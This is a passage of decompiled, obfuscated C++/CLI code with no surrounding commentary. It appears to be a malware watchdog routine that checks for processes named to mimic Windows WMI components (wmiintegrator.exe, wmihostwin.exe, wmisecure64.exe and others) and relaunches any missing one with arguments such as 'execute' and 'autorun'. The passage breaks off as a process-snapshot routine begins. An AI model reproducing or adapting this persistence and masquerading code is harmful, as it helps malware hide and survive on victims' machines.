          if (\u003CModule\u003E.std\u002Eoperator\u003D\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(icm, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_00CNPNBAHC\u0040\u003F\u0024AA\u0040))
          {
            num3 = (byte) 1;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(icm);
            return true;
          }
          if (\u003CModule\u003E.std\u002Eoperator\u003D\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(icm, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07EMGJIMLB\u0040execute\u003F\u0024AA\u0040))
          {
            num3 = (byte) 1;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(icm);
            return true;
          }
          if (\u003CModule\u003E.std\u002Eoperator\u0021\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(icm, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03EGBKCEAL\u0040unk\u003F\u0024AA\u0040) && \u003CModule\u003E.std\u002Eoperator\u0021\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(icm, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_04HKOEJHNN\u0040unk2\u003F\u0024AA\u0040) && \u003CModule\u003E.std\u002Eoperator\u0021\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(icm, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_04GDPPKGJM\u0040unk3\u003F\u0024AA\u0040))
          {
            basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorWcharT, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1CE\u0040IPDBFFIC\u0040\u003F\u0024AAw\u003F\u0024AAm\u003F\u0024AAi\u003F\u0024AAi\u003F\u0024AAn\u003F\u0024AAt\u003F\u0024AAe\u003F\u0024AAg\u003F\u0024AAr\u003F\u0024AAa\u003F\u0024AAt\u003F\u0024AAo\u003F\u0024AAr\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAe\u003F\u0024AA\u003F\u0024AA\u0040);
            bool flag;
            // ISSUE: fault handler
            try
            {
              flag = !\u003CModule\u003E.pWNqRmwPzwupZ(&stdAllocatorWcharT);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT);
            if (flag)
            {
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar;
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr1 = &stdAllocatorChar;
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr2 = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03EGBKCEAL\u0040unk\u003F\u0024AA\u0040);
              \u003CModule\u003E.NvPARABTz((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BC\u0040GPFBCAPP\u0040wmiintegrator\u003F4exe\u003F\u0024AA\u0040, stdAllocatorCharPtr2);
            }
            if (\u003CModule\u003E.std\u002Eoperator\u003D\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(icm, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0P\u0040KGNFHGGP\u0040nocreatefolder\u003F\u0024AA\u0040))
            {
              num3 = (byte) 1;
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(icm);
              return false;
            }
            num3 = (byte) 1;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(icm);
            return true;
          }
          basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT1;
          int num4;
          if (\u003CModule\u003E.std\u002Eoperator\u003D\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(icm, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_04GDPPKGJM\u0040unk3\u003F\u0024AA\u0040))
          {
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorWcharT1, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1CE\u0040IPDBFFIC\u0040\u003F\u0024AAw\u003F\u0024AAm\u003F\u0024AAi\u003F\u0024AAi\u003F\u0024AAn\u003F\u0024AAt\u003F\u0024AAe\u003F\u0024AAg\u003F\u0024AAr\u003F\u0024AAa\u003F\u0024AAt\u003F\u0024AAo\u003F\u0024AAr\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAe\u003F\u0024AA\u003F\u0024AA\u0040);
            // ISSUE: fault handler
            try
            {
              num1 |= 1U;
              if (!\u003CModule\u003E.pWNqRmwPzwupZ(&stdAllocatorWcharT1))
              {
                num4 = 1;
                goto label_27;
              }
            }
            __fault
            {
              if (((int) num1 & 1) != 0)
              {
                num1 &= 4294967294U;
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
              }
            }
          }
          // ISSUE: fault handler
          try
          {
            num4 = 0;
          }
          __fault
          {
            if (((int) num1 & 1) != 0)
            {
              num1 &= 4294967294U;
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
            }
          }
label_27:
          bool flag1;
          // ISSUE: fault handler
          try
          {
            flag1 = num4 != 0;
          }
          __fault
          {
            if (((int) num1 & 1) != 0)
            {
              num1 &= 4294967294U;
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
            }
          }
          if (((int) num1 & 1) != 0)
          {
            num1 &= 4294967294U;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT1);
          }
          if (flag1)
          {
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr3 = &stdAllocatorChar;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr4 = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03EGBKCEAL\u0040unk\u003F\u0024AA\u0040);
            \u003CModule\u003E.NvPARABTz((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BC\u0040GPFBCAPP\u0040wmiintegrator\u003F4exe\u003F\u0024AA\u0040, stdAllocatorCharPtr4);
          }
          basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT2;
          int num5;
          if (\u003CModule\u003E.std\u002Eoperator\u003D\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(icm, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_03EGBKCEAL\u0040unk\u003F\u0024AA\u0040))
          {
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorWcharT2, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1BO\u0040LOJMNGFO\u0040\u003F\u0024AAw\u003F\u0024AAm\u003F\u0024AAi\u003F\u0024AAh\u003F\u0024AAo\u003F\u0024AAs\u003F\u0024AAt\u003F\u0024AAw\u003F\u0024AAi\u003F\u0024AAn\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAe\u003F\u0024AA\u003F\u0024AA\u0040);
            // ISSUE: fault handler
            try
            {
              num1 |= 2U;
              if (!\u003CModule\u003E.pWNqRmwPzwupZ(&stdAllocatorWcharT2))
              {
                num5 = 1;
                goto label_48;
              }
            }
            __fault
            {
              if (((int) num1 & 2) != 0)
              {
                num1 &= 4294967293U;
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT2);
              }
            }
          }
          // ISSUE: fault handler
          try
          {
            num5 = 0;
          }
          __fault
          {
            if (((int) num1 & 2) != 0)
            {
              num1 &= 4294967293U;
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT2);
            }
          }
label_48:
          bool flag2;
          // ISSUE: fault handler
          try
          {
            flag2 = num5 != 0;
          }
          __fault
          {
            if (((int) num1 & 2) != 0)
            {
              num1 &= 4294967293U;
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT2);
            }
          }
          if (((int) num1 & 2) != 0)
          {
            num1 &= 4294967293U;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT2);
          }
          if (flag2)
          {
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr5 = &stdAllocatorChar;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr6 = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_04HKOEJHNN\u0040unk2\u003F\u0024AA\u0040);
            \u003CModule\u003E.NvPARABTz((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0P\u0040OAFHBNOL\u0040wmihostwin\u003F4exe\u003F\u0024AA\u0040, stdAllocatorCharPtr6);
          }
          basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT3;
          int num6;
          if (\u003CModule\u003E.std\u002Eoperator\u003D\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(icm, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_04HKOEJHNN\u0040unk2\u003F\u0024AA\u0040))
          {
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorWcharT3, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1BG\u0040DAOOLJHJ\u0040\u003F\u0024AAw\u003F\u0024AAm\u003F\u0024AAi\u003F\u0024AAm\u003F\u0024AAi\u003F\u0024AAc\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAe\u003F\u0024AA\u003F\u0024AA\u0040);
            // ISSUE: fault handler
            try
            {
              num1 |= 4U;
              if (!\u003CModule\u003E.pWNqRmwPzwupZ(&stdAllocatorWcharT3))
              {
                num6 = 1;
                goto label_69;
              }
            }
            __fault
            {
              if (((int) num1 & 4) != 0)
              {
                num1 &= 4294967291U;
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT3);
              }
            }
          }
          // ISSUE: fault handler
          try
          {
            num6 = 0;
          }
          __fault
          {
            if (((int) num1 & 4) != 0)
            {
              num1 &= 4294967291U;
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT3);
            }
          }
label_69:
          bool flag3;
          // ISSUE: fault handler
          try
          {
            flag3 = num6 != 0;
          }
          __fault
          {
            if (((int) num1 & 4) != 0)
            {
              num1 &= 4294967291U;
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT3);
            }
          }
          if (((int) num1 & 4) != 0)
          {
            num1 &= 4294967291U;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT3);
          }
          if (flag3)
          {
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr7 = &stdAllocatorChar;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr8 = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_04GDPPKGJM\u0040unk3\u003F\u0024AA\u0040);
            \u003CModule\u003E.NvPARABTz((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0L\u0040HMHJEAKK\u0040wmimic\u003F4exe\u003F\u0024AA\u0040, stdAllocatorCharPtr8);
          }
          basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT4;
          int num7;
          if (\u003CModule\u003E.std\u002Eoperator\u003D\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(icm, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_04GDPPKGJM\u0040unk3\u003F\u0024AA\u0040))
          {
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorWcharT4, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1BM\u0040IENAKNKP\u0040\u003F\u0024AAw\u003F\u0024AAm\u003F\u0024AAi\u003F\u0024AAs\u003F\u0024AAe\u003F\u0024AAc\u003F\u0024AAu\u003F\u0024AAr\u003F\u0024AAe\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAx\u003F\u0024AAe\u003F\u0024AA\u003F\u0024AA\u0040);
            // ISSUE: fault handler
            try
            {
              num1 |= 8U;
              if (!\u003CModule\u003E.pWNqRmwPzwupZ(&stdAllocatorWcharT4))
              {
                num7 = 1;
                goto label_90;
              }
            }
            __fault
            {
              if (((int) num1 & 8) != 0)
              {
                num1 &= 4294967287U;
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT4);
              }
            }
          }
          // ISSUE: fault handler
          try
          {
            num7 = 0;
          }
          __fault
          {
            if (((int) num1 & 8) != 0)
            {
              num1 &= 4294967287U;
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT4);
            }
          }
label_90:
          bool flag4;
          // ISSUE: fault handler
          try
          {
            flag4 = num7 != 0;
          }
          __fault
          {
            if (((int) num1 & 8) != 0)
            {
              num1 &= 4294967287U;
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT4);
            }
          }
          if (((int) num1 & 8) != 0)
          {
            num1 &= 4294967287U;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT4);
          }
          if (flag4)
          {
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar1;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr9 = &stdAllocatorChar1;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr10 = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar1, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07EMGJIMLB\u0040execute\u003F\u0024AA\u0040);
            \u003CModule\u003E.NvPARABTz((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0O\u0040JPDNMFOC\u0040wmisecure\u003F4exe\u003F\u0024AA\u0040, stdAllocatorCharPtr10);
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar2;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr11 = &stdAllocatorChar2;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr12 = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar2, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07NLGPFEPB\u0040autorun\u003F\u0024AA\u0040);
            \u003CModule\u003E.NvPARABTz((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BA\u0040OBJOKNPG\u0040wmisecure64\u003F4exe\u003F\u0024AA\u0040, stdAllocatorCharPtr12);
          }
        }
        catch (Exception ex)
        {
        }
        catch (Exception ex1) when (
        {
          // ISSUE: unable to correctly present filter
          exception* exceptionPtr;
          if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) &\u003CModule\u003E.\u003F\u003F_R0PAVexception\u0040std\u0040\u0040\u00408, 0, (void*) &exceptionPtr) != 0)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
          uint num8 = 0;
          \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num2);
          try
          {
            try
            {
            }
            catch (Exception ex2) when (
            {
              // ISSUE: unable to correctly present filter
              num8 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
              if (num8 != 0U)
              {
                SuccessfulFiltering;
              }
              else
                throw;
            }
            )
            {
            }
            goto label_108;
            if (num8 != 0U)
              throw;
          }
          finally
          {
            \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num2, (int) num8);
          }
        }
label_108:
        \u003CModule\u003E.Sleep(100U);
      }
      __fault
      {
        if (num3 == (byte) 0)
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) icm);
        }
      }
    }
  }

  internal static unsafe void HZIStDwd(List<object> gfy)
  {
    // ISSUE: untyped stack allocation
    int num1 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    try
    {
      sbyte* numPtr = \u003CModule\u003E.xytREyYpBfTDh((string) gfy[0]);
      basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar1;
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar1, numPtr);
      basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT;
      tagPROCESSENTRY32W tagProcessentrY32W;
      void* toolhelp32Snapshot;
      // ISSUE: fault handler
      try
      {
        _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar2;
